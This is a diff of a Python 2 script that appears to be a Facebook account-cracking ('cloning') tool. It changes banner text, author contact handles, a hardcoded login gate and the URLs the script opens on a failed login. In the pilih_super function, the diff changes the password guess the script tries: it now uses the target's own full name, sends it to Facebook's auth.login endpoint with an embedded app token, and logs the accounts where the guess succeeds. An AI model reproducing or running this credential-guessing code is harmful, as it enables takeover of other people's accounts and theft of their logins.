@@ -50,7 +50,7 @@ def jalan(z):
 logo = """ ▄︻┻═┳一 ЩєLc๏Mє ┼๏ ┼ђє Fąş┼єş┼ єVєr cL๏ЙIЙG
            ▄︻┻═┳一 ♥️Δ₣gĦΔŇΞŞŦΔŇ-๏FFIcIąL♥️----------🔴
            ▄︻┻═┳一 ♥️♥️ qαℓαи∂αя - cL๏Йєr  ♥️♥️----🔴🔴
-           ▄︻┻═┳一    💪💪PAPPU-BACHA💪💪   🔴🔴
+           ▄︻┻═┳一  💪💪QALANDAR-BACHA💪💪   🔴🔴
            ▄︻┻═┳一 ---- FєєL ┼ђє P๏Щєr   --------🔴🔴
 	          ЩєLc๏Mє ┼๏ ЦЙLIMI┼єđ cL๏ЙIЙG
   
@@ -82,7 +82,7 @@ logo = """ ▄︻┻═┳一 ЩєLc๏Mє ┼๏ ┼ђє Fąş┼єş┼ єVєr
 \033[1;91m=======================================
 \033[1;96mAuthor  \033[1;93m: \033[1;92mQalandar Baba
 \033[1;96mInstagram \033[1;93m: \033[1: qalandar.alami
-\033[1;96mFacebook  \033[1;93m: \033[1: anas.kandahari
+\033[1;96mFacebook  \033[1;93m: \033[1: Qalandar.alami
 \033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/qalandar-baba/AFGHANISTAN
 \033[1;91m======================================="""
 
@@ -122,15 +122,15 @@ print  """\033[1;91m
                      ▇▇▇◣╲▇╱◢▇▇▇
                      ▇▇▇▇◣▇◢▇▇▇▇
                    WhatsApp : 0711786523
-\033[1;96mAuthor  \033[1;93m: \033[1;92miQalamdar Baba
-\033[1;96mInstagram \033[1;93m: \033[1;92miQalandar.alami
-\033[1;96mFacebook  \033[1;93m: \033[1;92m anas.kandahari
+\033[1;96mAuthor  \033[1;93m: \033[1;92m Qalamdar Baba
+\033[1;96mInstagram \033[1;93m: \033[1;92m Qalandar.alami
+\033[1;96mFacebook  \033[1;93m: \033[1;92m Qalandar.alami
 \033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/qalandar-baba/AFGHANISTAN
 \033[1;91m======================================="""
 print " \x1b[1;93m============================================================="
 
-CorrectUsername = "Qalandar"
-CorrectPassword = "raees.."
+CorrectUsername = "QALANDAR"
+CorrectPassword = "BABA.."
 
 loop = 'true'
 while (loop == 'true'):
@@ -142,10 +142,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open http://www.facebook.com/anas.kandahari')
+            os.system('xdg-open http://www.facebook.com/QALANDAR.BABA786')
     else:
         print "Wrong Username"
-        os.system('xdg-open  https://www.facebook.com/anas.kandahari ')
+        os.system('xdg-open  https://www.facebook.com/QALANDAR.BABA786 ')
 
 def login():
 	os.system('clear')
@@ -449,11 +449,11 @@ def pilih_super():
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
 															pass8 = b['full_name'] + ''
-															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
-																print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
-																oks.append(user+pass7)
+																print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass8
+																oks.append(user+pass8)
 		except:
 			pass
 		
